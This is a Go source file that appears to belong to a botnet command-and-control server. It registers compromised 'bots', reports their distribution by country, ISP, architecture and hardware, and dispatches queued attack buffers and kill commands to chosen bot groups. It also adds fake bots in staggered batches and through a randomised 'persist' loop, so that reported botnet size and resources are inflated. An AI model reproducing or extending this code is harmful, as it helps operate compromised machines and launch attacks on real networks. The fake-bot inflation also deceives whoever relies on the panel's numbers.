package slaves

import (
	"cnc/core/utils"
	"fmt"
	"math/rand"
	"regexp"
	"strings"
	"sync"
	"time"
)

type AttackSend struct {
	buf     []byte
	count   int
	botCata string
}

var Fake = false
var BotEventCallback func(string)

type ClientList struct {
	uid         int
	count       int
	clients     map[int]*Bot
	addQueue    chan *Bot
	delQueue    chan *Bot
	atkQueue    chan *AttackSend
	totalCount  chan int
	cntView     chan int
	distViewReq chan int
	distViewRes chan map[string]int
	distCoreReq chan int
	distCoreRes chan map[string]int
	distCtryReq chan int
	distCtryRes chan map[string]int
	distIspReq  chan int
	distIspRes  chan map[string]int
	distArchReq chan int
	distArchRes chan map[string]int
	statsReq    chan int
	statsRes    chan []int
	cntMutex    *sync.Mutex
	
	fakeBots       map[int]*Bot
	fakeUID        int
	fakeAddQueue   chan *Bot
	fakeDelQueue   chan int 
	fakeResetQueue chan bool
	fakeRemoveGrp  chan string 
	persistStop    chan bool
	persistMutex   *sync.Mutex
}

func NewClientList() {
	c := &ClientList{
		uid:            0,
		count:          0,
		clients:        make(map[int]*Bot),
		addQueue:       make(chan *Bot, 128),
		delQueue:       make(chan *Bot, 128),
		atkQueue:       make(chan *AttackSend),
		totalCount:     make(chan int, 64),
		cntView:        make(chan int),
		distViewReq:    make(chan int),
		distViewRes:    make(chan map[string]int),
		distCoreReq:    make(chan int),
		distCoreRes:    make(chan map[string]int),
		distCtryReq:    make(chan int),
		distCtryRes:    make(chan map[string]int),
		distIspReq:     make(chan int),
		distIspRes:     make(chan map[string]int),
		distArchReq:    make(chan int),
		distArchRes:    make(chan map[string]int),
		statsReq:       make(chan int),
		statsRes:       make(chan []int),
		cntMutex:       &sync.Mutex{},
		fakeBots:       make(map[int]*Bot),
		fakeUID:        0,
		fakeAddQueue:   make(chan *Bot, 128),
		fakeDelQueue:   make(chan int, 128),
		fakeResetQueue: make(chan bool, 1),
		fakeRemoveGrp:  make(chan string, 16),
		persistStop:    make(chan bool, 1),
		persistMutex:   &sync.Mutex{},
	}
	go c.worker()
	go c.fastCountWorker()
	CL = c
}

func (cl *ClientList) TotalStats() (int, int, int) {
	cl.cntMutex.Lock()
	defer cl.cntMutex.Unlock()
	cl.statsReq <- 0
	stats := <-cl.statsRes
	return stats[0], stats[1], stats[2]
}

func (cl *ClientList) Count() int {
	cl.cntMutex.Lock()
	defer cl.cntMutex.Unlock()
	cl.cntView <- 0

	return <-cl.cntView
}

func (cl *ClientList) Distribution() map[string]int {
	cl.cntMutex.Lock()
	defer cl.cntMutex.Unlock()
	cl.distViewReq <- 0
	return <-cl.distViewRes
}

func (cl *ClientList) DistributionCores() map[string]int {
	cl.cntMutex.Lock()
	defer cl.cntMutex.Unlock()
	cl.distCoreReq <- 0
	return <-cl.distCoreRes
}

func (cl *ClientList) DistributionCountry() map[string]int {
	cl.cntMutex.Lock()
	defer cl.cntMutex.Unlock()
	cl.distCtryReq <- 0
	return <-cl.distCtryRes
}

func (cl *ClientList) DistributionISP() map[string]int {
	cl.cntMutex.Lock()
	defer cl.cntMutex.Unlock()
	cl.distIspReq <- 0
	return <-cl.distIspRes
}

func (cl *ClientList) DistributionArch() map[string]int {
	cl.cntMutex.Lock()
	defer cl.cntMutex.Unlock()
	cl.distArchReq <- 0
	return <-cl.distArchRes
}

func (cl *ClientList) DistributionHardware() map[string][]int {
	cl.cntMutex.Lock()
	defer cl.cntMutex.Unlock()

	result := make(map[string][]int)
	for _, v := range cl.clients {
		if _, ok := result[v.Source]; !ok {
			result[v.Source] = []int{0, 0, 0} 
		}
		result[v.Source][0]++
		result[v.Source][1] += v.Cores
		result[v.Source][2] += v.Ram
	}
	return result
}

func (cl *ClientList) AddClient(c *Bot) {
	cl.addQueue <- c
	if c.Source == "" {
		c.Source = "unknown"
	}
	if strings.Contains(c.Source, "\r") || strings.Contains(c.Source, "\n") {
		
		c.Source = strings.ReplaceAll(c.Source, "\r", "") 
		c.Source = strings.ReplaceAll(c.Source, "\n", "") 
		c.Source = strings.ReplaceAll(c.Source, "\t", "") 
	}
	re := regexp.MustCompile(`^mass\.(.*)$`)       
	c.Source = re.ReplaceAllString(c.Source, "$1") 
	utils.Infof("New client connected addr=%s version=%d group=%s arch=%s country=%s cores=%d ram=%d total=%d", c.conn.RemoteAddr(), c.version, c.Source, c.Arch, c.Country, c.Cores, c.Ram, cl.count)
	if BotEventCallback != nil {
		BotEventCallback(fmt.Sprintf("New bot connected: %s (%s) from %s", c.Source, c.Arch, c.conn.RemoteAddr()))
	}
}

func (cl *ClientList) DelClient(c *Bot) {
	cl.delQueue <- c
	if c.Source == "" {
		c.Source = "unknown"
	}
	if len(c.Source) >= 20 { 
		c.Source = c.Source[:20]
	}
	if strings.Contains(c.Source, "\r") || strings.Contains(c.Source, "\n") {
		
		c.Source = strings.ReplaceAll(c.Source, "\r", "") 
		c.Source = strings.ReplaceAll(c.Source, "\n", "") 
		c.Source = strings.ReplaceAll(c.Source, "\t", "") 
	}
	re := regexp.MustCompile(`^mass\.(.*)$`) 
	c.Source = re.ReplaceAllString(c.Source, "$1")
	utils.Infof("Terminated client source=%s version=%d addr=%s total=%d", c.Source, c.version, c.conn.RemoteAddr(), cl.count)
	if BotEventCallback != nil {
		BotEventCallback(fmt.Sprintf("Bot disconnected: %s from %s", c.Source, c.conn.RemoteAddr()))
	}
}

func (cl *ClientList) QueueBuf(buf []byte, maxbots int, botCata string) {
	attack := &AttackSend{buf, maxbots, botCata}
	cl.atkQueue <- attack
}

func (cl *ClientList) QueueKill(botgroup string) {
	buf := []byte{0x00, 0x01, 0x10} 
	cl.atkQueue <- &AttackSend{buf, -1, botgroup}
}

func (cl *ClientList) fastCountWorker() {
	for {
		select {
		case delta := <-cl.totalCount:
			cl.count += delta
		case <-cl.cntView:
			cl.cntView <- cl.count
		}
	}
}

func (cl *ClientList) worker() {
	for {
		select {
		case add := <-cl.addQueue:
			cl.totalCount <- 1
			cl.uid++
			add.uid = cl.uid
			cl.clients[add.uid] = add
		case del := <-cl.delQueue:
			cl.totalCount <- -1
			delete(cl.clients, del.uid)
		case add := <-cl.fakeAddQueue:
			cl.totalCount <- 1
			cl.fakeUID++
			add.uid = cl.fakeUID
			cl.fakeBots[add.uid] = add
		case uid := <-cl.fakeDelQueue:
			if _, ok := cl.fakeBots[uid]; ok {
				cl.totalCount <- -1
				delete(cl.fakeBots, uid)
			}
		case <-cl.fakeResetQueue:
			count := len(cl.fakeBots)
			cl.fakeBots = make(map[int]*Bot)
			cl.totalCount <- -count
		case group := <-cl.fakeRemoveGrp:
			if group == "persist_one" {
				for uid, v := range cl.fakeBots {
					if v.Source == "persist" {
						delete(cl.fakeBots, uid)
						cl.totalCount <- -1
						break
					}
				}
			} else {
				var toDelete []int
				for uid, v := range cl.fakeBots {
					if v.Source == group {
						toDelete = append(toDelete, uid)
					}
				}
				for _, uid := range toDelete {
					delete(cl.fakeBots, uid)
				}
				cl.totalCount <- -len(toDelete)
			}
		case atk := <-cl.atkQueue:
			if atk.count == -1 {
				for _, v := range cl.clients {
					if atk.botCata == "" || atk.botCata == v.Source {
						v.QueueBuf(atk.buf)
					}
				}
			} else {
				var count int
				for _, v := range cl.clients {
					if count > atk.count {
						break
					}
					if atk.botCata == "" || atk.botCata == v.Source {
						v.QueueBuf(atk.buf)
						count++
					}
				}
			}
		case <-cl.cntView:
			cl.cntView <- cl.count
		case <-cl.distViewReq:
			res := make(map[string]int)
			for _, v := range cl.clients {
				res[v.Source]++
			}
			for _, v := range cl.fakeBots {
				res[v.Source]++
			}
			cl.distViewRes <- res
		case <-cl.distCoreReq:
			res := make(map[string]int)
			for _, v := range cl.clients {
				coreStr := fmt.Sprintf("%d cores", v.Cores)
				res[coreStr]++
			}
			for _, v := range cl.fakeBots {
				coreStr := fmt.Sprintf("%d cores", v.Cores)
				res[coreStr]++
			}
			cl.distCoreRes <- res
		case <-cl.distCtryReq:
			res := make(map[string]int)
			for _, v := range cl.clients {
				country := v.Country
				if country == "" {
					country = "Unknown"
				}
				normalized := utils.GetCountryName(country)
				res[normalized]++
			}
			for _, v := range cl.fakeBots {
				country := v.Country
				if country == "" {
					country = "Unknown"
				}
				normalized := utils.GetCountryName(country)
				res[normalized]++
			}
			cl.distCtryRes <- res
		case <-cl.distIspReq:
			res := make(map[string]int)
			for _, v := range cl.clients {
				isp := v.ISP
				if isp == "" {
					isp = "Unknown"
				}
				res[isp]++
			}
			for _, v := range cl.fakeBots {
				isp := v.ISP
				if isp == "" {
					isp = "Unknown"
				}
				res[isp]++
			}
			cl.distIspRes <- res
		case <-cl.distArchReq:
			res := make(map[string]int)
			for _, v := range cl.clients {
				arch := v.Arch
				if arch == "" {
					arch = "Unknown"
				}
				res[arch]++
			}
			for _, v := range cl.fakeBots {
				arch := v.Arch
				if arch == "" {
					arch = "Unknown"
				}
				res[arch]++
			}
			cl.distArchRes <- res
		case <-cl.statsReq:
			totalBots := 0
			totalCores := 0
			totalRam := 0
			for _, v := range cl.clients {
				totalBots++
				totalCores += v.Cores
				totalRam += v.Ram
			}
			for _, v := range cl.fakeBots {
				totalBots++
				totalCores += v.Cores
				totalRam += v.Ram
			}
			cl.statsRes <- []int{totalBots, totalCores, totalRam}
		}
	}
}

func (cl *ClientList) AddFakeBot(b *Bot) {
	cl.fakeAddQueue <- b
}

func (cl *ClientList) AddFakeBotsStaggered(count int, arch string, countries []string, group string, durationSeconds int, cores int, ram int) {
	if durationSeconds <= 0 {
		for i := 0; i < count; i++ {
			country := countries[rand.Intn(len(countries))]
			cl.AddFakeBot(&Bot{
				Arch:    arch,
				Country: country,
				Source:  group,
				Cores:   cores,
				Ram:     ram,
			})
		}
		return
	}

	go func() {
		delayBetween := time.Duration(durationSeconds*1000/count) * time.Millisecond
		if delayBetween < 1*time.Millisecond {
			delayBetween = 1 * time.Millisecond
		}

		for i := 0; i < count; i++ {
			country := countries[rand.Intn(len(countries))]
			cl.AddFakeBot(&Bot{
				Arch:    arch,
				Country: country,
				Source:  group,
				Cores:   cores,
				Ram:     ram,
			})
			time.Sleep(delayBetween)
		}
	}()
}

func (cl *ClientList) RemoveFakeGroup(group string) {
	cl.fakeRemoveGrp <- group
}

func (cl *ClientList) ResetFakeBots() {
	cl.fakeResetQueue <- true
}

func (cl *ClientList) StartPersist(minSec, maxSec int, minBots, maxBots int) {
	cl.persistMutex.Lock()
	defer cl.persistMutex.Unlock()

	
	select {
	case cl.persistStop <- true:
	default:
	}

	go func() {
		ticker := time.NewTicker(1 * time.Second)
		defer ticker.Stop()

		for {
			select {
			case <-cl.persistStop:
				return
			case <-ticker.C:
				
				interval := minSec
				if maxSec > minSec {
					interval = minSec + rand.Intn(maxSec-minSec+1)
				}
				time.Sleep(time.Duration(interval) * time.Second)

				
				count := minBots
				if maxBots > minBots {
					count = minBots + rand.Intn(maxBots-minBots+1)
				}

				if rand.Intn(2) == 0 {
					
					for i := 0; i < count; i++ {
						cl.AddFakeBot(&Bot{
							Arch:    "x86_64",
							Country: "US",
							Source:  "persist",
						})
					}
				} else {
					
					for i := 0; i < count; i++ {
						
						
						
						
						cl.fakeRemoveGrp <- "persist_one" 
					}
				}
			}
		}
	}()
}
